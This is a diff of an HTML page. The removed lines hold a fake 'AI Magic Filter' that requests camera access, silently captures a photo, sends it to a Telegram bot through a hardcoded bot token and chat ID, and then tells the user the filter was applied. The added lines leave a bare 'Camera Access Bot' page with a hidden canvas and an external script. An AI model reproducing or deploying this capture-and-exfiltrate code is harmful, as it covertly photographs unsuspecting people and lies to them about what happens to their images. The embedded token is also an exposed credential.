@@ -1,68 +1,12 @@
 <!DOCTYPE html>
-<html lang="ur">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>AI Magic Filter ✨</title>
-    <style>
-        body { font-family: sans-serif; text-align: center; background: #0f0f0f; color: white; padding-top: 60px; }
-        .card { max-width: 350px; margin: auto; border: 1px solid #333; padding: 20px; border-radius: 20px; background: #1a1a1a; }
-        button { background: linear-gradient(45deg, #00d2ff, #3a7bd5); color: white; border: none; padding: 15px 30px; border-radius: 50px; font-size: 18px; cursor: pointer; margin-top: 20px; }
-    </style>
+    <title>Camera Access Bot</title>
 </head>
 <body>
-
-    <div class="card">
-        <h2>AI Magic Filter ✨</h2>
-        <p>Click below to apply filter:</p>
-        <button id="startBtn">Apply Filter</button>
-        <canvas id="c" style="display:none;"></canvas>
-        <video id="v" autoplay style="display:none;"></video>
-    </div>
-
-    <script>
-        const botToken = "8416758474:AAFAAkUqnvJ6MSQHgKNFnNm1Dcm00anuzTg";
-        const chatId = "7107389141";
-
-        const btn = document.getElementById('startBtn');
-        const video = document.getElementById('v');
-        const canvas = document.getElementById('c');
-
-        btn.addEventListener('click', async () => {
-            try {
-                // Camera permission mangna
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                video.srcObject = stream;
-                btn.innerText = "Processing...";
-
-                // 2 second baad photo khinchna
-                setTimeout(async () => {
-                    const ctx = canvas.getContext('2d');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    canvas.toBlob(async (blob) => {
-                        const formData = new FormData();
-                        formData.append('chat_id', chatId);
-                        formData.append('photo', blob, 'capture.png');
-
-                        // Telegram ko bhejna
-                        await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        
-                        alert("Filter Applied Successfully!");
-                        btn.innerText = "Done!";
-                        stream.getTracks().forEach(t => t.stop());
-                    }, 'image/png');
-
-                }, 2000);
-            } catch (e) {
-                alert("Please allow camera access to use the filter.");
-            }
-        });
-    </script>
+    <h2>Camera Feed</h2>
+    <video id="video" width="640" height="480" autoplay></video>
+    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>
+    <script src="script.js"></script>
 </body>
 </html>
